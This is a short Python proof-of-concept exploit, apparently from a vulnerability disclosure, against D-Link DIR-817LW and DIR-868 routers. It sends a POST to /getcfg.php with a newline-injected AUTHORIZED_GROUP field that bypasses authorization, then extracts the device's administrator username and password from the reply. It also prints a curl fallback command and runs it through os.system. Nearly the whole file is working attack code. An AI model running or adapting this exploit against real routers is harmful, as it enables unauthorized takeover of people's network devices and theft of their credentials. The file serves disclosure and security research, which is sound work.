# -*- coding:utf-8 -*-
#get username and passwd from DIR-817LW,DIR-868,,,
# Acknowledgement
# Thanks to the partners who discovered the vulnerability together：
# Wei Xie
# Zhen-hua Wang
# En-Ze Wang

import requests, os
from lxml import etree
from traceback import print_exc
try:
    from urllib.parse import urljoin
except:
    from urlparse import urljoin
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import re

url = 'http://192.168.0.1/'
print("Exploit start...")
#########################get user and pass##########################
try:
    res = requests.post(urljoin(url,'/getcfg.php'),data={"SERVICES":"RUNTIME.WPS.WLAN-1","AUTHORIZED_GROUP":"1\n"})
    # print(res.content)
except:
    print("exploit fail...")
    print("you can try this command:")
    print("curl -k -d \"SERVICES=RUNTIME.WPS.WLAN-1&AUTHORIZED_GROUP=1%0a\" {}getcfg.php".format(url))
    print(os.system("curl -k -d \"SERVICES=RUNTIME.WPS.WLAN-1&AUTHORIZED_GROUP=1%0a\" {}getcfg.php".format(url)))
    exit()

if 'Not authorized' in res.content:
    print("authorize fail..")
    exit()
elif "BAD REQUEST" in res.content:
    print("BAD REQUEST, unsupported HTTP request")

try:
    name = re.findall("<name>(.*)</name>",res.content)
    passwd = re.findall("<password>(.*)</password>",res.content)
    print("name: %s\npasswd: %s\n"%(name[0],passwd[0]))
except:
    print("fail...")
    print(res.content)